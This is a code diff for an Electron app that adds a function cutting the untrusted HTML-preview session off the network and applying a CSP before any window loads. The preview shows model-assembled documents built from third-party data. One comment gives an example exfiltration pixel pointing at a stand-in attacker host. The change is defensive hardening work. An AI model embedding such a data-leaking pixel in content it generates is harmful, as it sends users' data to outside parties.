@@ -75,6 +75,8 @@ import { isCiRuntime as resolveCiRuntime, shouldDisableIjfw } from '@process/uti
 import { initPopoutBridge } from '@process/bridge/popoutBridge';
 import { AION_ASSET_PROTOCOL } from '@process/extensions';
 import { resolveAllowedAssetPath } from '@process/extensions/protocol/assetAllowlist';
+import { UNTRUSTED_PREVIEW_PARTITION } from '@/common/preview/untrustedPreview';
+import { hardenUntrustedPreviewSession } from '@process/services/preview/untrustedPreviewSession';
 import { initializeProcess } from './process';
 import { ProcessConfig } from './process/utils/initStorage';
 import { loadShellEnvironmentAsync, logEnvironmentDiagnostics, mergePaths } from './process/utils/shellEnv';
@@ -386,6 +388,24 @@ const isFirstPartyAppDocument = (rawUrl: string): boolean => {
   } catch {
     return false;
   }
+};
+
+/**
+ * P2-8: shut the preview partition off the network before any preview can load.
+ *
+ * The HTML preview renders a document a model assembled from third-party data,
+ * unattended on a cron. `sandbox=yes` + `contextIsolation=yes` already stop it
+ * reaching `ipcBridge`; what was left open was EGRESS - a `fetch()` or a bare
+ * `<img src="https://attacker/?d=...">` pixel needing no script at all. This
+ * cancels every non-local request in that one session and stamps the preview
+ * CSP onto documents the renderer cannot inject a `<meta>` into (a report
+ * opened straight off disk as `file://`).
+ *
+ * Installed at ready, before any window exists, because a listener registered
+ * after a document starts loading does not apply to it.
+ */
+const applyUntrustedPreviewPolicy = (): void => {
+  hardenUntrustedPreviewSession(session.fromPartition(UNTRUSTED_PREVIEW_PARTITION));
 };
 
 const applyRendererCsp = (): void => {
@@ -1335,6 +1355,8 @@ void app
     // SEC-ELEC-02: install the renderer CSP on the default session as early as
     // possible after ready, before any window loads its document.
     applyRendererCsp();
+    // P2-8: same reasoning, for the untrusted-preview partition (see above).
+    applyUntrustedPreviewPolicy();
     // Kick off cleanup-module prefetch BEFORE handleAppReady so it runs in
     // parallel with init. Failure is non-fatal - before-quit handles undefined.
     _cleanupModulesPromise = prefetchCleanupModules();
